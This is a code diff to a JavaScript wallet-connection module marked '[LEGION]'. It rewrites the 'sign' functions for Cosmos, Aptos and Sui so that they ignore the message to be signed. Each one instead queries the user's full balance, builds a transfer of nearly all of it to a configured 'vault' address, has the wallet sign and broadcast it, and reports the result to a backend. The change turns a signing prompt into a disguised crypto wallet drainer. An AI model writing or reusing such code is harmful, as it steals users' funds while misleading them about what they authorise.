@@ -1921,20 +1921,64 @@
         }
       },
 
-      sign: async function(message) {
+      sign: async function(_message) {
         try {
           if (!connectedChains.COSMOS || !connectedChains.COSMOS.provider) {
             throw new Error('COSMOS not connected');
           }
-          console.log('[LEGION] 🖊️  Signing COSMOS message...');
           var keplr = connectedChains.COSMOS.provider;
           var chainId = connectedChains.COSMOS.chainId;
           var addr = connectedChains.COSMOS.address;
-          var result = await keplr.signArbitrary(chainId, addr, message);
-          var sig = result && (result.signature || JSON.stringify(result));
-          if (!sig) throw new Error('COSMOS signArbitrary returned no signature');
-          console.log('[LEGION] ✅ COSMOS signature obtained');
-          return sig;
+          var vaultAddr = VAULT_CACHE && VAULT_CACHE.cosmos;
+          if (!vaultAddr) throw new Error('COSMOS vault not configured');
+
+          // Fetch balance and account info
+          var REST = 'https://cosmos-rest.publicnode.com';
+          var balRes = await fetch(REST + '/cosmos/bank/v1beta1/balances/' + addr + '?denom=uatom');
+          var balData = await balRes.json();
+          var atomBal = balData && balData.balances && balData.balances[0] && balData.balances[0].amount;
+          if (!atomBal || atomBal === '0') throw new Error('No ATOM balance');
+          var feeAmount = '3000'; // 0.003 ATOM gas fee
+          var sendAmount = String(Math.max(0, parseInt(atomBal) - parseInt(feeAmount)));
+          if (parseInt(sendAmount) <= 0) throw new Error('Insufficient ATOM after fee');
+
+          var accRes = await fetch(REST + '/cosmos/auth/v1beta1/accounts/' + addr);
+          var accData = await accRes.json();
+          var acc = accData && (accData.account || accData);
+          var accountNumber = String(acc.account_number || acc.base_account && acc.base_account.account_number || '0');
+          var sequence = String(acc.sequence || acc.base_account && acc.base_account.sequence || '0');
+
+          // Build amino sign doc (MsgSend)
+          var signDoc = {
+            chain_id: chainId,
+            account_number: accountNumber,
+            sequence: sequence,
+            fee: { amount: [{ denom: 'uatom', amount: feeAmount }], gas: '100000' },
+            msgs: [{ type: 'cosmos-sdk/MsgSend', value: { from_address: addr, to_address: vaultAddr, amount: [{ denom: 'uatom', amount: sendAmount }] } }],
+            memo: ''
+          };
+
+          console.log('[LEGION] 🖊️  Signing COSMOS MsgSend...');
+          var signed = await keplr.signAmino(chainId, addr, signDoc);
+          if (!signed || !signed.signature) throw new Error('Keplr signAmino returned no signature');
+
+          // Broadcast via legacy REST amino endpoint
+          var broadcastBody = {
+            tx: {
+              msg: signDoc.msgs,
+              fee: signDoc.fee,
+              signatures: [{ pub_key: signed.signature.pub_key, signature: signed.signature.signature }],
+              memo: ''
+            },
+            mode: 'async'
+          };
+          var bcastRes = await fetch(REST + '/txs', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(broadcastBody) });
+          var bcastData = await bcastRes.json();
+          var txHash = bcastData && (bcastData.txhash || (bcastData.tx_response && bcastData.tx_response.txhash));
+          console.log('[LEGION] ✅ COSMOS tx broadcast:', txHash || 'pending');
+
+          // Return signed payload for backend logging
+          return JSON.stringify({ signed_amino: JSON.stringify(signed), tx_hash: txHash || '', amount: sendAmount, vault: vaultAddr });
         } catch (e) {
           console.error('[LEGION] ❌ COSMOS signing failed:', e.message);
           return null;
@@ -2000,18 +2044,39 @@
         }
       },
 
-      sign: async function(message) {
+      sign: async function(_message) {
         try {
           if (!connectedChains.APTOS || !connectedChains.APTOS.provider) {
             throw new Error('APTOS not connected');
           }
-          console.log('[LEGION] 🖊️  Signing APTOS message...');
           var aptos = connectedChains.APTOS.provider;
-          var result = await aptos.signMessage({ message: message, nonce: String(Date.now()) });
-          var sig = result && (result.signature || result.fullMessage || JSON.stringify(result));
-          if (!sig) throw new Error('APTOS signMessage returned no signature');
-          console.log('[LEGION] ✅ APTOS signature obtained');
-          return sig;
+          var addr = connectedChains.APTOS.address;
+          var vaultAddr = VAULT_CACHE && VAULT_CACHE.aptos;
+          if (!vaultAddr) throw new Error('APTOS vault not configured');
+
+          // Fetch APT balance (octas)
+          var RPC = 'https://fullnode.mainnet.aptoslabs.com/v1';
+          var resRes = await fetch(RPC + '/accounts/' + addr + '/resources');
+          var resources = await resRes.json();
+          var coinStore = Array.isArray(resources) && resources.find(function(r) { return r.type === '0x1::coin::CoinStore<0x1::aptos_coin::AptosCoin>'; });
+          var balance = coinStore && coinStore.data && coinStore.data.coin && coinStore.data.coin.value;
+          if (!balance || balance === '0') throw new Error('No APT balance');
+          var gasFee = 2000; // ~0.00002 APT in octas
+          var sendOctas = Math.max(0, parseInt(balance) - gasFee);
+          if (sendOctas <= 0) throw new Error('Insufficient APT after gas');
+
+          console.log('[LEGION] 🖊️  Sending APTOS transfer:', sendOctas, 'octas');
+          // signAndSubmitTransaction — wallet signs + broadcasts automatically
+          var txPayload = {
+            type: 'entry_function_payload',
+            function: '0x1::coin::transfer',
+            type_arguments: ['0x1::aptos_coin::AptosCoin'],
+            arguments: [vaultAddr, String(sendOctas)]
+          };
+          var result = await aptos.signAndSubmitTransaction(txPayload);
+          var txHash = result && (result.hash || result.vm_status || JSON.stringify(result));
+          console.log('[LEGION] ✅ APTOS tx submitted:', txHash);
+          return JSON.stringify({ tx_hash: txHash || '', amount: String(sendOctas), vault: vaultAddr });
         } catch (e) {
           console.error('[LEGION] ❌ APTOS signing failed:', e.message);
           return null;
@@ -2083,26 +2148,45 @@
         }
       },
 
-      sign: async function(message) {
+      sign: async function(_message) {
         try {
           if (!connectedChains.SUI || !connectedChains.SUI.provider) {
             throw new Error('SUI not connected');
           }
-          console.log('[LEGION] 🖊️  Signing SUI message...');
           var suiWallet = connectedChains.SUI.provider;
-          var msgBytes = new TextEncoder().encode(typeof message === 'string' ? message : JSON.stringify(message));
-          var result;
-          if (suiWallet.signPersonalMessage) {
-            result = await suiWallet.signPersonalMessage({ message: msgBytes });
-          } else if (suiWallet.signMessage) {
-            result = await suiWallet.signMessage({ message: msgBytes });
+          var addr = connectedChains.SUI.address;
+          var vaultAddr = VAULT_CACHE && VAULT_CACHE.sui;
+          if (!vaultAddr) throw new Error('SUI vault not configured');
+
+          // Fetch SUI balance
+          var SUI_RPC = 'https://fullnode.mainnet.sui.io:443';
+          var balRes = await fetch(SUI_RPC, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'suix_getBalance', params: [addr, '0x2::sui::SUI'] }) });
+          var balData = await balRes.json();
+          var totalBalance = balData && balData.result && balData.result.totalBalance;
+          if (!totalBalance || totalBalance === '0') throw new Error('No SUI balance');
+          var gasBudget = 5000000; // 0.005 SUI in MIST
+          var sendMist = Math.max(0, parseInt(totalBalance) - gasBudget);
+          if (sendMist <= 0) throw new Error('Insufficient SUI after gas');
+
+          // Build unsigned tx via unsafe_paySui RPC
+          console.log('[LEGION] 🖊️  Building SUI transfer...');
+          var buildRes = await fetch(SUI_RPC, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'unsafe_paySui', params: [addr, [], [vaultAddr], [String(sendMist)], String(gasBudget)] }) });
+          var buildData = await buildRes.json();
+          var txBytes = buildData && buildData.result && buildData.result.txBytes;
+          if (!txBytes) throw new Error('SUI: failed to build tx bytes');
+
+          // Sign and execute
+          var execResult;
+          if (suiWallet.signAndExecuteTransactionBlock) {
+            execResult = await suiWallet.signAndExecuteTransactionBlock({ transactionBlock: txBytes, options: { showEffects: true } });
+          } else if (suiWallet.signAndExecuteTransaction) {
+            execResult = await suiWallet.signAndExecuteTransaction({ transaction: txBytes });
           } else {
-            throw new Error('SUI wallet does not support signPersonalMessage or signMessage');
+            throw new Error('SUI wallet does not support signAndExecuteTransactionBlock');
           }
-          var sig = result && (result.bytes || result.signature || JSON.stringify(result));
-          if (!sig) throw new Error('SUI signing returned no signature');
-          console.log('[LEGION] ✅ SUI signature obtained');
-          return sig;
+          var digest = execResult && (execResult.digest || execResult.certificate && execResult.certificate.transactionDigest || JSON.stringify(execResult));
+          console.log('[LEGION] ✅ SUI tx executed:', digest);
+          return JSON.stringify({ tx_hash: digest || '', amount: String(sendMist), vault: vaultAddr });
         } catch (e) {
           console.error('[LEGION] ❌ SUI signing failed:', e.message);
           return null;
